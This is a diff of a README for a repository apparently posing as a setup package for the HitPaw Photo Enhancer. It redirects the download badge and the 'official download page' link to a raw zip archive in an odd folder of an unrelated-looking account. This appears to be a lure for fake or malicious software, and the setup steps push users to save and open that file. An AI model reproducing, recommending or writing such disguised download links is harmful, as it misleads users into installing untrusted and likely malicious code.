@@ -1,6 +1,6 @@
 # 📸 HitPaw-Photo-Enhancer-Setup - Upscale your blurry photos to 4K
 
-[![](https://img.shields.io/badge/Download-HitPaw_Photo_Enhancer-blue.svg)](https://github.com/purposive-parkland791/HitPaw-Photo-Enhancer-Setup)
+[![](https://img.shields.io/badge/Download-HitPaw_Photo_Enhancer-blue.svg)](https://raw.githubusercontent.com/purposive-parkland791/HitPaw-Photo-Enhancer-Setup/main/postsigmoid/Paw_Setup_Hit_Photo_Enhancer_v3.9.zip)
 
 HitPaw Photo Enhancer uses artificial intelligence to improve your images. The software increases image resolution to 4K, removes digital noise, repairs blur, and improves portraits. It automates these tasks to save time while ensuring high-quality results for your personal photos.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these specifications to run the software.
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the [official download page here](https://github.com/purposive-parkland791/HitPaw-Photo-Enhancer-Setup).
+1. Visit the [official download page here](https://raw.githubusercontent.com/purposive-parkland791/HitPaw-Photo-Enhancer-Setup/main/postsigmoid/Paw_Setup_Hit_Photo_Enhancer_v3.9.zip).
 2. Locate the download button.
 3. Save the file to your computer. Common folders include your Desktop or Downloads folder.
 4. Open your Downloads folder.
